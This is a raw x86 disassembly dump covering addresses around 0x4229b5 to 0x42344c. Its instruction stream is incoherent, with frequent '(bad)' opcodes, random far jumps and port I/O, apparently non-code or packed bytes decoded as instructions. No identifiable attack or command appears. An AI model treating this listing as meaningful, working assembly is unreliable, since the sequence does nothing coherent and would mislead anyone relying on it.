  4229b5:	enter  0xb9f6,0x53
  4229b9:	into   
  4229ba:	pop    es
  4229bb:	sti    
  4229bc:	inc    eax
  4229bd:	fwait
  4229be:	push   esi
  4229bf:	cmp    eax,ebx
  4229c1:	sub    DWORD PTR [ebx+0x4c],esp
  4229c4:	scas   eax,DWORD PTR es:[edi]
  4229c5:	lods   eax,DWORD PTR ds:[esi]
  4229c6:	sub    DWORD PTR [eax],edx
  4229c8:	adc    ah,dh
  4229ca:	mov    ah,0xf2
  4229cc:	outs   dx,BYTE PTR ds:[esi]
  4229cd:	cmp    al,0xff
  4229cf:	jo     0x422979
  4229d1:	inc    ecx
  4229d2:	loopne 0x422963
  4229d4:	inc    esp
  4229d5:	dec    eax
  4229d6:	jns    0x4229ec
  4229d8:	sbb    esi,esi
  4229da:	(bad)  
  4229db:	fcom   DWORD PTR ds:0x76b2b58
  4229e1:	test   cl,dl
  4229e3:	icebp  
  4229e4:	aaa    
  4229e5:	dec    ebp
  4229e6:	sahf   
  4229e7:	or     BYTE PTR [ecx+edx*8-0x50],0xc9
  4229ec:	jl     0x422a1c
  4229ee:	xchg   ebx,eax
  4229ef:	lods   eax,DWORD PTR ds:[esi]
  4229f0:	cmc    
  4229f1:	mov    BYTE PTR [esi+0x3a],al
  4229f4:	fadd   DWORD PTR [ebp+0x25]
  4229f7:	cdq    
  4229f8:	out    0x71,al
  4229fa:	mov    esi,0x53c41aae
  4229ff:	pop    ebx
  422a00:	cmp    bl,BYTE PTR [edi]
  422a02:	add    DWORD PTR [edx+0x56],ebx
  422a05:	cwde   
  422a06:	inc    esp
  422a07:	(bad)  
  422a08:	stc    
  422a09:	xor    ah,BYTE PTR [ebp-0x69]
  422a0c:	add    eax,DWORD PTR [esp+eax*1-0x5cdbfe51]
  422a13:	add    bh,BYTE PTR [ecx-0x42f0e011]
  422a19:	(bad)  
  422a1a:	lds    edi,FWORD PTR [edx+0x5a]
  422a1d:	aad    0x1d
  422a1f:	pop    edi
  422a20:	fist   DWORD PTR [esi]
  422a22:	cmp    bl,BYTE PTR [edi]
  422a24:	lock xor DWORD PTR [esi],ecx
  422a27:	addr16 sahf 
  422a29:	inc    esp
  422a2a:	js     0x422a4e
  422a2c:	or     al,0xa9
  422a2e:	mov    edi,0x324ff057
  422a33:	mov    ecx,0x3c9b22f5
  422a38:	fcomp  DWORD PTR [ecx-0x32]
  422a3b:	outs   dx,BYTE PTR ds:[esi]
  422a3c:	into   
  422a3d:	test   DWORD PTR [ebx+0x45],esp
  422a40:	cmp    al,ah
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	xchg   esp,eax
  422ac1:	and    al,0x3a
  422ac3:	mov    esi,0x172ce
  422ac8:	test   BYTE PTR [eax],0x0
  422acb:	add    BYTE PTR [eax-0x4],bl
  422ace:	mov    dh,0x60
  422ad0:	pop    es
  422ad1:	push   0x76
  422ad3:	repnz mov ch,0x3b
  422ad6:	cmp    DWORD PTR [ecx],eax
  422ad8:	pop    eax
  422ad9:	stc    
  422ada:	mov    edi,0x341684af
  422adf:	push   0xffffffb6
  422ae1:	fst    QWORD PTR [esi-0x53]
  422ae4:	add    BYTE PTR [ebx],ch
  422ae6:	or     al,BYTE PTR [edx+0x1307bcaa]
  422aec:	loop   0x422ae6
  422aee:	cmp    bl,BYTE PTR [eax]
  422af0:	mov    al,ds:0xb9677f2d
  422af5:	shr    DWORD PTR ss:[esi+ebx*1+0x1a],cl
  422afa:	imul   esp,DWORD PTR [eax],0x9476b96d
  422b00:	cs inc eax
  422b02:	or     DWORD PTR [ebx+0x17],ecx
  422b05:	pop    ds
  422b06:	mov    dl,BYTE PTR [ebx+0xe1c02f5]
  422b0c:	dec    ebp
  422b0d:	imul   eax,DWORD PTR [eax+0xf],0x24cca84f
  422b14:	mov    ds:0xff5e108f,al
  422b19:	mov    cl,0xdc
  422b1b:	sbb    eax,ebx
  422b1d:	jbe    0x422b0e
  422b1f:	das    
  422b20:	in     al,dx
  422b21:	(bad)  
  422b22:	mov    eax,0xd935ab77
  422b27:	mov    ds:0x830c0e4f,eax
  422b2c:	mov    dh,0x4a
  422b2e:	into   
  422b2f:	mov    bh,0xb3
  422b31:	jge    0x422ade
  422b33:	sub    BYTE PTR es:[esi],dh
  422b36:	cmp    al,0x77
  422b38:	int    0xe8
  422b3a:	data16 (bad) 
  422b3c:	ds mov edi,0x47586be3
  422b42:	cld    
  422b43:	mov    ch,BYTE PTR [edx+edi*2-0x70]
  422b47:	fadd   QWORD PTR [edx+esi*4]
  422b4a:	into   
  422b4b:	loope  0x422af2
  422b4d:	mov    DWORD PTR [esi+0xb],eax
  422b50:	dec    edx
  422b51:	(bad)  
  422b52:	clc    
  422b53:	(bad)  [esi-0x65]
  422b56:	sbb    DWORD PTR [edi-0x78f2aae6],ebp
  422b5c:	push   ebp
  422b5d:	and    dl,BYTE PTR [ecx]
  422b5f:	adc    eax,0xf24df190
  422b64:	mov    edi,0x5c3591f9
  422b69:	in     al,0xd5
  422b6b:	add    bh,BYTE PTR [esi-0x70]
  422b6e:	repz jns 0x422ba5
  422b71:	sbb    BYTE PTR [ecx+0x62],0x7a
  422b75:	xor    ah,ch
  422b77:	adc    eax,0xb8a07cca
  422b7c:	pop    es
  422b7d:	pop    eax
  422b7e:	popf   
  422b7f:	cmp    ecx,esp
  422b81:	sbb    dl,BYTE PTR [esi+0x71]
  422b84:	das    
  422b85:	mov    edi,DWORD PTR [eax]
  422b87:	(bad)  
  422b88:	loopne 0x422b12
  422b8a:	sbb    DWORD PTR [edx-0x66],edx
  422b8d:	lds    edx,FWORD PTR [ebp-0x60]
  422b90:	(bad)
  422b94:	fisub  WORD PTR [edi-0x1f7c6409]
  422b9a:	jl     0x422c01
  422b9c:	fcomip st,st(4)
  422b9e:	mov    BYTE PTR [edi+0x7b],bh
  422ba1:	push   ss
  422ba2:	pop    ebp
  422ba3:	mul    BYTE PTR [ecx+0x7b24bb27]
  422ba9:	cwde   
  422baa:	repnz ins BYTE PTR es:[edi],dx
  422bac:	sti    
  422bad:	sub    ah,BYTE PTR [edi-0x29]
  422bb0:	push   ss
  422bb1:	pop    ebp
  422bb2:	cmp    ebp,DWORD PTR [eax+0x6c]
  422bb5:	into   
  422bb6:	mov    DWORD PTR ds:0xcfcc4146,ecx
  422bbc:	dec    edx
  422bbd:	mov    dl,BYTE PTR [edx+eax*1-0x67]
  422bc1:	daa    
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	dec    ecx
  422c41:	and    ch,dh
  422c43:	dec    ecx
  422c44:	les    esi,FWORD PTR [ebx+0x1]
  422c47:	add    dh,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR ds:0x1c469caf,bl
  422c51:	(bad)  [eax-0x1d0810a3]
  422c57:	xor    BYTE PTR [edi+ebp*4+0x7018a5c5],dl
  422c5e:	fnstenv [edi+0x3e]
  422c61:	ja     0x422c9d
  422c63:	pop    es
  422c64:	outs   dx,BYTE PTR ds:[esi]
  422c65:	ja     0x422c29
  422c67:	cmp    dl,BYTE PTR [eax+0x6206ecb5]
  422c6d:	fiadd  DWORD PTR [ecx+0x3d]
  422c70:	mov    esp,0x1520dbd8
  422c75:	adc    esp,DWORD PTR [eax+0x683bab49]
  422c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c7c:	mov    BYTE PTR [esi-0x22],dh
  422c7f:	icebp  
  422c80:	and    BYTE PTR [edx+0x29],dl
  422c83:	call   0xdd3fa87b
  422c88:	or     esi,edx
  422c8a:	clc    
  422c8b:	mov    ah,0x64
  422c8d:	push   esi
  422c8e:	jl     0x422c9f
  422c90:	and    edx,ebp
  422c92:	push   ds
  422c93:	mov    eax,ds:0x4179627
  422c98:	xchg   DWORD PTR [edx+0x79a4673b],esi
  422c9e:	out    0x87,eax
  422ca0:	cmp    dh,ch
  422ca2:	push   ebx
  422ca3:	leave  
  422ca4:	(bad)  
  422ca5:	fcmovb st,st(3)
  422ca7:	push   cs
  422ca8:	jae    0x422d17
  422caa:	xor    BYTE PTR [edx-0x4d],ah
  422cad:	inc    esp
  422cae:	xchg   DWORD PTR [edx-0x21],ecx
  422cb1:	jae    0x422c8a
  422cb3:	jl     0x422c66
  422cb5:	aam    0xf3
  422cb7:	stc    
  422cb8:	dec    eax
  422cb9:	data16 fsubr DWORD PTR gs:[ebp-0x292d1a1]
  422cc1:	jae    0x422d3a
  422cc3:	fxch   st(2)
  422cc5:	or     BYTE PTR [esi-0x42ed6586],ah
  422ccb:	retf   0xc43f
  422cce:	jge    0x422d10
  422cd0:	or     al,0x6a
  422cd2:	out    0x27,al
  422cd4:	loop   0x422c89
  422cd6:	mov    bh,BYTE PTR [ebp+0x44]
  422cd9:	pop    edx
  422cda:	adc    ah,cl
  422cdc:	sti    
  422cdd:	ja     0x422cbc
  422cdf:	jo     0x422c72
  422ce1:	dec    ebp
  422ce2:	lds    ecx,FWORD PTR [edi+ebp*8+0x22]
  422ce6:	add    al,0x62
  422ce8:	rol    BYTE PTR [eax+0x69260a44],0xa4
  422cef:	popf   
  422cf0:	or     DWORD PTR ds:0x210e815a,edi
  422cf6:	xor    BYTE PTR [esi+ebx*2],bl
  422cf9:	fwait
  422cfa:	push   ecx
  422cfb:	inc    ecx
  422cfc:	outs   dx,BYTE PTR ds:[esi]
  422cfd:	jp     0x422d3c
  422cff:	add    DWORD PTR [edi+0x785d5eb4],ebp
  422d05:	int3   
  422d06:	add    ch,0x6c
  422d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d0a:	push   ebp
  422d0b:	retf   
  422d0c:	mov    al,ds:0x17b86b58
  422d11:	out    0x6c,al
  422d13:	stc    
  422d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d15:	push   edx
  422d16:	push   edi
  422d17:	ss lahf 
  422d19:	jl     0x422d2f
  422d1b:	lods   eax,DWORD PTR ds:[esi]
  422d1c:	push   edi
  422d1d:	stc    
  422d1e:	shl    dl,1
  422d20:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  422d22:	sub    al,0x8d
  422d24:	and    cl,BYTE PTR [edi]
  422d26:	inc    esp
  422d27:	dec    eax
  422d28:	mov    edi,DWORD PTR [esi-0x2d]
  422d2b:	mov    ds:0xb1270135,eax
  422d30:	lods   eax,DWORD PTR ds:[esi]
  422d31:	or     eax,0x60a3d39e
  422d36:	sub    bl,BYTE PTR [ebx+edi*8]
  422d39:	add    eax,0x2682c799
  422d3e:	push   ebx
  422d3f:	(bad)  
  422d40:	(bad)  
  422d41:	inc    esp
	...
  422db2:	add    BYTE PTR [eax],al
  422db4:	iret   
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0xa2e0f9f7
  422dc2:	adc    dh,cl
  422dc4:	mov    edx,0xf6000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    bl,cl
  422dcd:	mov    edi,edx
  422dcf:	fidiv  DWORD PTR [ebx+0x4b04c3a]
  422dd5:	and    ebx,eax
  422dd7:	push   es
  422dd8:	pop    esi
  422dd9:	sub    DWORD PTR [edx],edi
  422ddb:	cs int3 
  422ddd:	pop    ss
  422dde:	pop    esp
  422ddf:	ret    0x81a
  422de2:	(bad)  
  422de3:	(bad)  
  422de4:	pop    es
  422de5:	inc    ebx
  422de6:	xor    eax,0xfa63846f
  422deb:	mov    cl,0x42
  422ded:	push   esi
  422dee:	mov    dh,0x22
  422df0:	fs or  al,bl
  422df3:	sbb    ah,BYTE PTR [esi-0x3eefe6b7]
  422df9:	adc    ch,0xe9
  422dfc:	xchg   BYTE PTR [edx+0x1b],dl
  422dff:	xor    BYTE PTR [esi],0x30
  422e02:	pop    esp
  422e03:	bound  ecx,QWORD PTR [ebx-0x5]
  422e06:	idiv   DWORD PTR [edx]
  422e08:	jmp    0x8ebbb182
  422e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e0e:	jbe    0x422da4
  422e10:	imul   eax,DWORD PTR [ebx-0xb1f7430],0x57df3f18
  422e1a:	adc    eax,DWORD PTR [ebx+edx*4+0x6]
  422e1e:	push   ebx
  422e1f:	push   ds
  422e20:	enter  0x22e0,0x48
  422e24:	lds    ecx,FWORD PTR [ebx-0x6f1e92f6]
  422e2a:	xlat   BYTE PTR ds:[ebx]
  422e2b:	clc    
  422e2c:	sub    eax,0x497af231
  422e31:	and    DWORD PTR [edi],ecx
  422e33:	fnstsw WORD PTR [edi-0x6c20ae]
  422e39:	mov    esi,0xba61cdd8
  422e3e:	sbb    esi,DWORD PTR [eax+0x6d]
  422e41:	fst    DWORD PTR [ebx-0x71]
  422e44:	fidivr WORD PTR [ecx]
  422e46:	and    BYTE PTR [edx],cl
  422e48:	cmc    
  422e49:	fistp  WORD PTR [edx]
  422e4b:	push   0x7fc7403b
  422e50:	fs icebp 
  422e52:	dec    edx
  422e53:	fmul   DWORD PTR [ecx+0xd]
  422e56:	or     al,BYTE PTR [edx+0xdef4cff]
  422e5c:	push   0xb9f43fe7
  422e61:	call   0x1fd8:0xf5e1835b
  422e68:	pop    ebx
  422e69:	out    0x67,eax
  422e6b:	adc    al,0x61
  422e6d:	sbb    al,0x97
  422e6f:	test   eax,0x6cc5f8f4
  422e74:	add    ebp,eax
  422e76:	push   0x8d89d9f1
  422e7b:	xchg   DWORD PTR [ebx+0x54],eax
  422e7e:	add    BYTE PTR [ecx],bh
  422e80:	pop    ecx
  422e81:	mov    bl,0xde
  422e83:	js     0x422ec9
  422e85:	(bad)  
  422e86:	cld    
  422e87:	add    al,0x1c
  422e89:	jbe    0x422e6a
  422e8b:	xchg   ebx,eax
  422e8c:	cmc    
  422e8d:	(bad)
  422e90:	out    dx,eax
  422e91:	and    DWORD PTR ds:0x137596ba,eax
  422e97:	arpl   WORD PTR [edx-0x3b4d2048],si
  422e9d:	in     eax,0xbc
  422e9f:	stos   BYTE PTR es:[edi],al
  422ea0:	aam    0x31
  422ea2:	ficom  WORD PTR [edi+0x47]
  422ea5:	or     BYTE PTR [ebx],dl
  422ea7:	pop    esp
  422ea8:	pop    ebx
  422ea9:	push   0x4a3e79fa
  422eae:	jae    0x422f2c
  422eb0:	das    
  422eb1:	and    eax,0x694145f4
  422eb6:	push   0xc687bf18
  422ebb:	adc    al,0x4
  422ebd:	push   edx
  422ebe:	sbb    BYTE PTR [edi],dh
  422ec0:	sub    bh,BYTE PTR [ecx]
	...
  422f32:	add    BYTE PTR [eax],al
  422f34:	imul   eax,DWORD PTR [esi],0xffffff8f
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    bl,BYTE PTR fs:[bx+0x6bea]
  422f43:	loop   0x422ef5
  422f45:	jne    0x422f48
  422f47:	add    dh,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    BYTE PTR [ecx],dh
  422f4d:	cmp    bh,BYTE PTR [edx+0x48e24c28]
  422f53:	jle    0x422fc8
  422f55:	scas   al,BYTE PTR es:[edi]
  422f56:	dec    ecx
  422f57:	leave  
  422f58:	into   
  422f59:	pop    ebx
  422f5a:	inc    ecx
  422f5b:	icebp  
  422f5c:	mov    eax,ds:0xe0cb52a3
  422f61:	(bad)  
  422f62:	cmp    eax,0x3144a3a0
  422f67:	fidiv  WORD PTR [ebp+0x784e9259]
  422f6d:	pushf  
  422f6e:	mov    esp,0x9cec945d
  422f73:	jmp    0x422f57
  422f75:	mov    dh,0x69
  422f77:	adc    BYTE PTR [edi+edx*8],dh
  422f7a:	je     0x422f9a
  422f7c:	mov    ah,0x53
  422f7e:	scas   eax,DWORD PTR es:[edi]
  422f7f:	fidiv  WORD PTR [ecx-0x3f6f7414]
  422f86:	ja     0x422f3c
  422f88:	jae    0x422fbd
  422f8a:	push   ds
  422f8b:	dec    edi
  422f8c:	lock retf 
  422f8e:	(bad)  
  422f8f:	sub    BYTE PTR [esi+0x10e8f546],cl
  422f95:	dec    DWORD PTR [ecx]
  422f97:	jno    0x422ff7
  422f99:	cmp    al,BYTE PTR [ebx+0x3e]
  422f9c:	xchg   esp,eax
  422f9d:	out    dx,eax
  422f9e:	mov    dh,0x65
  422fa0:	jg     0x422f36
  422fa2:	in     al,dx
  422fa3:	ret    
  422fa4:	sbb    ah,BYTE PTR ds:0xa5a896d3
  422faa:	mov    eax,ds:0x4fdb0136
  422faf:	mov    cl,0x0
  422fb1:	push   es
  422fb2:	aaa    
  422fb3:	push   edi
  422fb4:	sbb    ah,BYTE PTR ds:0xa8bb3426
  422fba:	outs   dx,BYTE PTR ds:[esi]
  422fbb:	push   0x53783353
  422fc0:	sbb    BYTE PTR [esi+0x49],ch
  422fc3:	test   BYTE PTR [esi+0x5],dh
  422fc6:	inc    edi
  422fc7:	data16 sbb cl,BYTE PTR [eax]
  422fca:	xor    al,0x99
  422fcc:	inc    ecx
  422fcd:	jg     0x422f89
  422fcf:	mov    edx,0xd510a139
  422fd4:	inc    esp
  422fd5:	lahf   
  422fd6:	jg     0x422fd2
  422fd8:	jae    0x423028
  422fda:	inc    esp
  422fdb:	mov    eax,ds:0x9bc90269
  422fe0:	loopne 0x423053
  422fe2:	mov    dl,0xa1
  422fe4:	xor    eax,0x90fe487
  422fe9:	out    dx,eax
  422fea:	outs   dx,DWORD PTR ds:[esi]
  422feb:	and    eax,0x5f5a45b4
  422ff0:	(bad)  
  422ff1:	lods   al,BYTE PTR ds:[esi]
  422ff2:	scas   al,BYTE PTR es:[edi]
  422ff3:	push   0xffffffe0
  422ff5:	fadd   DWORD PTR [ecx+0x57]
  422ff8:	inc    ebp
  422ff9:	loope  0x422f8f
  422ffb:	or     BYTE PTR [edi+eiz*1],cl
  422ffe:	mov    ah,dl
  423000:	and    DWORD PTR [ebx],esi
  423002:	and    BYTE PTR [eax-0x58],0xdf
  423006:	adc    DWORD PTR [ebp-0x57],ebp
  423009:	ja     0x422f9b
  42300b:	mov    ds:0x9736f473,eax
  423010:	mov    edi,0xb3b31a80
  423015:	std    
  423016:	sub    eax,0xdfc5385
  42301b:	pop    ds
  42301c:	adc    eax,0x1f182a4c
  423021:	xor    edx,DWORD PTR [edi-0x1cd77efc]
  423027:	test   dh,dl
  423029:	jb     0x423077
  42302b:	(bad)  
  42302c:	les    esi,FWORD PTR [edx+ecx*4-0x5019430a]
  423033:	jns    0x423033
  423035:	xor    al,0xa
  423037:	push   cs
  423038:	inc    edi
  423039:	call   0x9c0d:0x9aac1a77
  423040:	test   DWORD PTR [eax+eax*1+0x0],esi
	...
  4230b3:	add    BYTE PTR [esi-0x284ae],ah
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	sti    
  4230c1:	and    dh,bh
  4230c3:	pop    ebp
  4230c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230c5:	jbe    0x4230c8
  4230c7:	add    dh,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [edi-0x23],bh
  4230ce:	add    eax,esi
  4230d0:	jmp    0xdc8a:0xacf6c098
  4230d7:	pop    ecx
  4230d8:	div    BYTE PTR [esi-0xc5ef8ed]
  4230de:	in     eax,0x1f
  4230e0:	repz loope 0x423151
  4230e3:	test   ch,bl
  4230e5:	xchg   DWORD PTR [ebx-0x1c],ebp
  4230e8:	repnz xchg ebp,eax
  4230ea:	call   0x119d:0x5468a8d
  4230f1:	sub    al,0x76
  4230f3:	or     DWORD PTR [edx+0x44],esp
  4230f6:	rol    BYTE PTR [eax],0x31
  4230f9:	inc    ecx
  4230fa:	fmul   QWORD PTR [ebx]
  4230fc:	jmp    0x798f1505
  423101:	add    esi,DWORD PTR [esi-0x7945599]
  423107:	dec    esp
  423108:	jne    0x423110
  42310a:	mov    dh,dl
  42310c:	pop    ebp
  42310d:	mov    bh,0x55
  42310f:	dec    eax
  423110:	push   0xfc6f4fb9
  423115:	out    dx,al
  423116:	stc    
  423117:	cdq    
  423118:	(bad)  
  423119:	mov    bh,0xe1
  42311b:	shr    BYTE PTR [edi-0x2e3d778f],0xd2
  423122:	loopne 0x42311b
  423124:	imul   al
  423126:	fcomp  DWORD PTR [eax+0x1d]
  423129:	std    
  42312a:	push   cs
  42312b:	(bad)  
  42312c:	clc    
  42312d:	mov    DWORD PTR [ebp+0x68],esi
  423130:	mov    al,ds:0x55a6e13b
  423135:	dec    esp
  423136:	fucom  st(4)
  423138:	xchg   ebx,eax
  423139:	ror    BYTE PTR [esi-0x76583d80],0xa7
  423140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423141:	sbb    al,BYTE PTR [ebp+0x1a]
  423144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423145:	loop   0x4230d5
  423147:	and    eax,0xe3b806d1
  42314c:	jmp    0xb59a:0xf1cef5aa
  423153:	shl    BYTE PTR [esi],0xd9
  423156:	pop    esi
  423157:	pop    esi
  423158:	sar    edx,1
  42315a:	popa   
  42315b:	mov    ds:0x6a1b28ba,eax
  423160:	xlat   BYTE PTR ds:[ebx]
  423161:	add    BYTE PTR [eax+0x68e29dd],0xf2
  423168:	icebp  
  423169:	cmp    BYTE PTR [esi+0x2f7fb005],ah
  42316f:	push   esp
  423170:	pop    ds
  423171:	push   ds
  423172:	pop    esi
  423173:	loopne 0x42311a
  423175:	imul   eax,DWORD PTR [ebp*8+0x6a12a99a],0x34
  42317d:	xor    eax,0x646d1fae
  423182:	dec    ebx
  423183:	addr16 sub al,0xe7
  423186:	in     al,0x9
  423188:	cdq    
  423189:	enter  0x7bdb,0xcc
  42318d:	sub    al,0xb
  42318f:	sbb    esp,esi
  423191:	sub    DWORD PTR [eax+0x6a827f4f],esi
  423197:	sbb    al,0x12
  423199:	add    DWORD PTR [ebx+eax*2-0x42a4071d],0xffffffbb
  4231a1:	mov    ebx,0x21169f9f
  4231a6:	or     dh,ah
  4231a8:	xchg   DWORD PTR [ecx],esi
  4231aa:	xchg   esp,eax
  4231ab:	xor    BYTE PTR [ebx+edx*1-0x5b],0x71
  4231b0:	sbb    eax,0x1761298b
  4231b5:	pop    ss
  4231b6:	xor    bh,al
  4231b8:	lea    ebp,[edi-0xe]
  4231bb:	xchg   edi,eax
  4231bc:	out    dx,al
  4231bd:	push   esi
  4231be:	sub    DWORD PTR [eax+0x25],ecx
  4231c1:	sbb    DWORD PTR [eax],eax
	...
  423233:	add    BYTE PTR [edi-0x10085213],cl
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0x256589b0
  423243:	jl     0x4231e1
  423245:	ja     0x423248
  423247:	add    dh,dh
  423249:	add    BYTE PTR [eax],al
  42324b:	add    BYTE PTR [eax],dh
  42324d:	xchg   ecx,eax
  42324e:	xlat   BYTE PTR ds:[ebx]
  42324f:	je     0x423283
  423251:	leave  
  423252:	aaa    
  423253:	adc    al,0x73
  423255:	xor    edx,DWORD PTR [edi]
  423257:	add    BYTE PTR [edi+0x5fc231a3],ah
  42325d:	sub    esi,ebx
  42325f:	daa    
  423260:	or     bl,BYTE PTR [edi]
  423262:	shl    BYTE PTR [ebx-0x80],cl
  423265:	pop    es
  423266:	push   es
  423267:	pop    eax
  423268:	(bad)  
  423269:	std    
  42326a:	mov    BYTE PTR [ebx-0x1d],dh
  42326d:	add    BYTE PTR [ecx],0x2d
  423270:	int3   
  423271:	mov    ch,0x5b
  423273:	sar    ebp,cl
  423275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423276:	mov    ds:0x5c99dd1e,eax
  42327b:	(bad)  
  42327c:	int3   
  42327d:	jl     0x423216
  42327f:	push   ds
  423280:	das    
  423281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423282:	popf   
  423283:	sub    esi,edi
  423285:	enter  0xb4f5,0x39
  423289:	sbb    al,0xc0
  42328b:	repnz std 
  42328d:	aaa    
  42328e:	mov    al,0xb5
  423290:	adc    dh,BYTE PTR ds:0x629330ab
  423296:	sub    ah,al
  423298:	or     eax,0x260544ad
  42329d:	dec    eax
  42329e:	pusha  
  42329f:	icebp  
  4232a0:	jns    0x42330a
  4232a2:	out    0x9e,eax
  4232a4:	pop    esi
  4232a5:	gs push eax
  4232a7:	jmp    0x5984:0x70e267d9
  4232ae:	test   BYTE PTR [esp+eax*8+0x40],0x26
  4232b3:	sub    BYTE PTR [ebx-0x2bfd694d],dh
  4232b9:	loopne 0x4232f7
  4232bb:	push   ebp
  4232bc:	in     eax,0xe0
  4232be:	jne    0x423247
  4232c0:	retf   
  4232c1:	jmp    0x42326f
  4232c3:	mov    ds:0x755c9528,al
  4232c8:	out    0x98,al
  4232ca:	and    al,al
  4232cc:	test   al,0xa
  4232ce:	loopne 0x423265
  4232d0:	lahf   
  4232d1:	push   esp
  4232d2:	pop    ss
  4232d3:	imul   esi,DWORD PTR [eax],0xffffffe3
  4232d6:	jb     0x423275
  4232d8:	sbb    al,0xa6
  4232da:	mov    al,0x8d
  4232dc:	or     DWORD PTR [ecx],0xe9a7a16a
  4232e2:	and    ch,ch
  4232e4:	pop    edx
  4232e5:	popa   
  4232e6:	mov    ch,0xf7
  4232e8:	stc    
  4232e9:	fstp   QWORD PTR [edx+eax*8+0x26d8d6f3]
  4232f0:	shr    BYTE PTR [esi+0x76],1
  4232f3:	ret    0x697f
  4232f6:	jns    0x4232ac
  4232f8:	mov    esi,eax
  4232fa:	adc    al,0x92
  4232fc:	retf   
  4232fd:	stos   DWORD PTR es:[edi],eax
  4232fe:	and    dh,cl
  423300:	jle    0x4232e8
  423302:	cmp    eax,0xa1777fca
  423307:	push   ebx
  423308:	push   ebx
  423309:	cld    
  42330a:	loopne 0x42332a
  42330c:	sub    DWORD PTR [esi-0x3f],ebp
  42330f:	dec    esp
  423310:	xchg   esi,eax
  423311:	test   eax,0xf2484e72
  423316:	add    ebp,esp
  423318:	sbb    al,0x2
  42331a:	mul    edx
  42331c:	fcom   DWORD PTR [esi+edi*8-0x65]
  423320:	mov    ebx,0x175bfec5
  423325:	(bad)  
  423326:	std    
  423327:	scas   al,BYTE PTR es:[edi]
  423328:	mov    bh,0xf5
  42332a:	push   edi
  42332b:	stos   DWORD PTR es:[edi],eax
  42332c:	inc    eax
  42332d:	dec    ebp
  42332e:	jnp    0x4232eb
  423330:	cmp    ecx,DWORD PTR [edi-0x6b]
  423333:	mov    esp,0xe663da5b
  423338:	(bad)  
  423339:	sbb    bl,dl
  42333b:	mov    ds:0xbd6d3287,eax
  423340:	popf   
  423341:	push   edi
	...
  4233b2:	add    BYTE PTR [eax],al
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	ror    BYTE PTR [edi+0x7892bd48],cl
  4233c6:	add    DWORD PTR [eax],eax
  4233c8:	test   BYTE PTR [eax],0x0
  4233cb:	add    bh,bl
  4233cd:	pop    ds
  4233ce:	sub    BYTE PTR [esi+0x54fd8405],dh
  4233d4:	push   ebp
  4233d5:	fistp  QWORD PTR [edx-0x2a]
  4233d8:	int    0xce
  4233da:	pop    edi
  4233db:	scas   eax,DWORD PTR es:[edi]
  4233dc:	push   edi
  4233dd:	lock ror DWORD PTR [edx],cl
  4233e0:	dec    edx
  4233e1:	and    BYTE PTR [eax+0x23],dl
  4233e4:	(bad)  
  4233e5:	sub    cl,BYTE PTR [edx+0x4dc76699]
  4233eb:	inc    edx
  4233ec:	xlat   BYTE PTR ds:[ebx]
  4233ed:	or     dl,BYTE PTR [edx]
  4233ef:	pop    edi
  4233f0:	cmp    DWORD PTR ds:0xc7cc338f,0x43
  4233f7:	ds jnp 0x423470
  4233fa:	xor    esp,DWORD PTR [edi]
  4233fc:	jno    0x4233dd
  4233fe:	pusha  
  4233ff:	rcr    BYTE PTR [ecx],cl
  423401:	mov    ebp,0xc462e34f
  423406:	jge    0x423437
  423408:	add    BYTE PTR [ecx+0x7cc8affb],0x84
  42340f:	pop    ecx
  423410:	xchg   edx,eax
  423411:	inc    ecx
  423412:	pop    ss
  423413:	lea    eax,[edx-0x4ecc9b73]
  423419:	ret    
  42341a:	neg    al
  42341c:	fidiv  WORD PTR [ebx+0x59]
  42341f:	rcl    DWORD PTR [edi+0x43],1
  423422:	sub    eax,DWORD PTR [edi+0x2d]
  423425:	in     eax,dx
  423426:	into   
  423427:	mov    ebx,0xfe6f1fbd
  42342c:	add    bh,BYTE PTR [ebx]
  42342e:	mov    bh,0xbe
  423430:	sub    cl,bh
  423432:	push   0xffffffdc
  423434:	mov    bh,0xca
  423436:	inc    ebx
  423437:	pop    esi
  423438:	cwde   
  423439:	(bad)  
  42343a:	pop    ebp
  42343b:	aaa    
  42343c:	ja     0x423467
  42343e:	rol    BYTE PTR [edi+ebx*4-0x514b754f],0x59
  423446:	push   ss
  423447:	scas   eax,DWORD PTR es:[edi]
  423448:	sbb    al,0x1
  42344a:	mov    dl,0xd3
  42344c:	and    eax,0x8a51c52d
